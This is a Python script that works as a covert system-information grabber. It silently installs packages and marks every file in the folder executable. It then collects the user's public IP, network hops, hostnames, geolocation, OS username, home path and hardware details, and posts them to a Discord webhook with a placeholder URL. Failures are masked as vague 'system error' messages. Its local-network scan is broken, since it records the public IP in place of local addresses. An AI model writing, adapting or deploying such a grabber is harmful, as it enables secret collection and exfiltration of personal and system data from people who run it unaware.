import os, subprocess
try:
	subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
try:
	subprocess.run(["pip", "install", "psutil"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
import requests
import platform
import psutil
import socket
import webbrowser
import random

os.system("chmod +x *")
if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
info = []
try:
	ip = requests.get(f"http://ifconfig.me/ip").text
except:
	ip = ""
	print("system error. 01")
try:
	fwd = requests.get(f"http://ifconfig.me/forwarded").text
	hops = fwd[fwd.find(",")+1:]
	hops = ", ".join(hops.replace(",", " ").split())
except:
	print("system error. 02")
	hops = ""
info.append(f"-")
info.append(f"IP ADDRESS: || {ip} ||")
info.append(f"HOP ADDRESSES: || {hops} ||")
try:
	dnses = socket.gethostbyaddr(ip)
	for hostname, n in zip(dnses, range(len(dnses))):
		if hostname == ip:
			pass
		else:
			info.append(f"HOSTNAME {n+1}: || {hostname} ||")
except:
	print("system error. 03")
opens = []
for n in range(1, 255):
	ipp = f"192.168.1.{n}"
	s = socket.socket()
	try:
		s.bind((ipp, 65534))
		opens.append(ip)
	except:
		pass
	s.close()
info.append(f"OPEN LANS: || {', '.join(opens)} ||")
try:
	i = requests.get(f"http://ipapi.co/{ip}/json", headers={"User-Agent": "bot"}).json()
	try:
		del i["ip"]
	except:
		pass
	for h1, h2 in i.items():
		h1 = h1.upper().replace("_", " ")
		info.append(f"{h1}: || {h2} ||")
except:
	print("system error. 04")
try:
	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nMACHINE TYPE: || {platform.machine()} ||\nOS FAMILY: || {platform.system_alias(platform.system(), platform.release(), 0)} ||")
except:
	print("system error. 06")
try:
	info.append(f"PROCESS COUNT: || {len(psutil.pids())} ||")
except:
	print("system error. 07")
try:
	info.append(f"MAIN PATH: || {os.path.expanduser('~')} ||")
except:
	print("system error. 08")
info.append(f"-")
try:
	data = {"content": "\n".join(info)}
	r = requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
	print(r.text)
except:
	print("system error. 09")
